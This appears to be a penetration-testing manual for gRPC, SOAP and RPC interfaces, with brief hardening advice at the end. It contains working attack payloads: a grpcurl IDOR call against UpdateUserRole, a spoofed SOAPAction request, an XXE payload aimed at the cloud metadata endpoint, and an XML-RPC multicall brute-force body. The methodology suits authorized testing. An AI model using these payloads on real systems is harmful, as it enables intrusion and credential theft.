# gRPC, SOAP & RPC Architectural Protocol Security Manual

This manual documents offensive security testing methodologies for non-REST application interfaces, specifically focusing on modern **gRPC (HTTP/2 + Protocol Buffers)** systems and enterprise legacy **SOAP / WSDL / XML-RPC / JSON-RPC** services.

---

## 1. gRPC Security Assessment Workflow

gRPC relies on HTTP/2 transport and Protocol Buffers (protobuf) binary serialization. While high-performance, developer assumptions often bypass standard web security layers (e.g. WAFs, API gateways, and authorization filters).

### A. Discovery & Schema Reflection
1. **Server Reflection Detection:**
   Check if the gRPC server exposes its protobuf service definition via gRPC Server Reflection Protocol:
   ```bash
   # List services using grpcurl
   grpcurl -plaintext target.com:50051 list

   # Describe a specific service schema
   grpcurl -plaintext target.com:50051 describe api.v1.UserService
   ```
2. **Burp Suite Integration:**
   - Use the **gRPC UI** or **Protobuf-Editor** extension in Burp Suite to intercept, decode, and modify binary protobuf frames as JSON.
3. **No Reflection? Extract from Client Bundles:**
   - Reverse-engineer Android APKs (`JADX`) or Webpack bundles (`.proto` or `.json` definitions) to reconstruct message structures and method names.

### B. High-Impact Attack Vectors
1. **Object-Level Authorization (BOLA / IDOR) across Methods:**
   - Developers frequently enforce authentication on `GetProfile` but omit authorization checks on newly added gRPC endpoints:
     ```json
     // Invoking with unprivileged user credentials
     grpcurl -plaintext -H "authorization: Bearer <MEMBER_TOKEN>" \
             -d '{"user_id": "VICTIM_ID"}' target.com:50051 api.v1.UserService/UpdateUserRole
     ```
2. **Method Confusion & Reflection Tampering:**
   - Test internal methods exposed under namespaces like `internal.v1.*` or `admin.v1.*`.
3. **Denial of Service via Unbounded Streaming:**
   - Client-streaming or bidirectional streaming endpoints that lack backpressure mechanisms can exhaust worker threads or memory buffers.

---

## 2. SOAP / WSDL Security Testing

Enterprise SOAP web services transmit XML payloads encapsulated in SOAP Envelopes, coordinated by WSDL descriptors.

### A. WSDL Discovery & Method Enumeration
1. **Locate WSDL Definitions:**
   - Fuzz for common descriptors: `?wsdl`, `?disco`, `/service.asmx?wsdl`, `/ws/UserService?wsdl`.
2. **Analyze Exported Operations:**
   - Import WSDL into Burp Suite (Wsdler extension) or SoapUI to inspect all available SOAP actions, data types, and required headers.

### B. Key Exploitation Techniques
1. **SOAPaction Header Spoofing:**
   - In environments where an API gateway inspects the HTTP `SOAPAction` header while the backend backend parses the XML body, mismatch them to bypass authorization gates:
     ```http
     POST /services/OrderService HTTP/1.1
     Host: api.target.com
     SOAPAction: "http://target.com/CancelOrder"
     Content-Type: text/xml; charset=utf-8

     <soapenv:Envelope ...>
       <soapenv:Body>
         <target:ApproveOrder>
           <target:orderId>1042</target:orderId>
         </target:ApproveOrder>
       </soapenv:Body>
     </soapenv:Envelope>
     ```
2. **XXE in SOAP Envelopes:**
   - Inject DOCTYPE entities inside the SOAP XML header or body to extract local files or trigger SSRF:
     ```xml
     <?xml version="1.0"?>
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
     <soapenv:Envelope ...>
       <soapenv:Body>
         <target:GetData>&xxe;</target:GetData>
       </soapenv:Body>
     </soapenv:Envelope>
     ```

---

## 3. XML-RPC & JSON-RPC Auditing

1. **XML-RPC `system.multicall` Brute-Force & Denial of Service:**
   - Test if WordPress or custom XML-RPC services allow batching hundreds of authentication attempts in a single HTTP request:
     ```xml
     <methodCall>
       <methodName>system.multicall</methodName>
       <params><param><value><array><data>
         <value><struct>
           <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
           <member><name>params</name><value><array><data><value>admin</value><value>pass1</value></data></array></value></member>
         </struct></value>
       </data></array></value></param></params>
     </methodCall>
     ```
2. **JSON-RPC Method Authorization:**
   - Check JSON-RPC endpoints (`POST /rpc` or `/jsonrpc`) for administrative methods (`admin.*`, `debug.*`, `system.*`).

---

## 4. Remediation & Hardening Guidelines
* Disable gRPC Server Reflection in production deployments.
* Enforce unified, policy-based authorization (e.g. OPA / Envoy filters) uniformly across REST and gRPC gateways.
* Completely disable external entity resolution (`XMLConstants.FEATURE_SECURE_PROCESSING`) across all XML/SOAP parsers.
